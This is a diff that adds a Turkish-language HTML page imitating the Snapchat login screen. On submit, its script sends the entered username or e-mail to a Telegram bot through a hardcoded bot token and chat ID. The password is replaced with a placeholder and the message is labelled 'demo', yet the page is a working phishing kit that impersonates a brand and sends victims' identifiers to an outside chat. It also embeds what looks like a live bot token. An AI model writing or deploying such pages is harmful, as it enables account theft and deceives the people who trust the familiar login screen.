@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Snapchat Giriş</title>
+  <style>
+    :root{
+      --snap-yellow:#fffc00;
+      --ink:#111;
+      --card:#fff;
+      --radius:18px;
+      --shadow:0 10px 30px rgba(0,0,0,.12);
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+      background:linear-gradient(180deg,#fff799,#ffe400);
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+      color:var(--ink)
+    }
+    .wrap{width:100%;max-width:460px}
+    .card{background:var(--card);border-radius:20px;padding:22px;box-shadow:var(--shadow);overflow:hidden}
+    .brand{display:flex;align-items:center;gap:12px;justify-content:center;margin-bottom:8px}
+    .ghost{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--snap-yellow);border:2px solid var(--ink);font-size:26px}
+    h1{margin:0;font-size:22px}
+    form{display:grid;gap:12px;margin-top:8px}
+    .field{position:relative}
+    .input{width:100%;padding:14px;border-radius:12px;border:2px solid #e8e8e8;font-size:15px;outline:none}
+    .input:focus{border-color:var(--ink);box-shadow:0 6px 18px rgba(0,0,0,.06)}
+    .btn{padding:12px;border-radius:12px;border:none;background:var(--ink);color:#fff;font-weight:700;cursor:pointer}
+    .btn:disabled{opacity:.6;cursor:not-allowed}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="main" aria-labelledby="title">
+      <div class="brand">
+        <div class="ghost" aria-hidden="true">👻</div>
+        <h1 id="title">Snapchat</h1>
+      </div>
+
+      <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="on" novalidate>
+        <div class="field">
+          <input id="uid" name="uid" class="input" type="text" inputmode="email" placeholder="Kullanıcı adı veya e-posta" required minlength="3" />
+        </div>
+
+        <div class="field">
+          <input id="pass" name="pass" class="input" type="password" placeholder="Şifre" required minlength="6" />
+        </div>
+
+        <button class="btn" id="submitBtn" type="submit">Giriş Yap</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8388814881:AAFwU8y2X8OrGqt1L9C-2viSBtH7YGvBITw';
+    const TELEGRAM_CHAT_ID   = '1997779342';
+
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    async function handleSubmit(e){
+      e.preventDefault();
+
+      if(!form.checkValidity()){
+        form.reportValidity();
+        return false;
+      }
+
+      const username = document.getElementById('uid').value.trim();
+      const passwordToSend = '***REDACTED***';
+
+      const now = new Date().toLocaleString('tr-TR');
+      const message = [
+        `📥 Demo Form Gönderimi`,
+        `Tarih: ${now}`,
+        `Kullanıcı adı / E-posta: ${username}`,
+        `Şifre: ${passwordToSend}`,
+        `(Tarayıcıdan gönderildi)`
+      ].join('\n');
+
+      submitBtn.disabled = true;
+
+      try{
+        const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };
+
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        alert('Demo gönderimi başarılı.');
+      } catch(err){
+        console.error(err);
+        alert('Gönderim başarısız.');
+      } finally {
+        submitBtn.disabled = false;
+      }
+
+      return false;
+    }
+  </script>
+</body>
+</html>
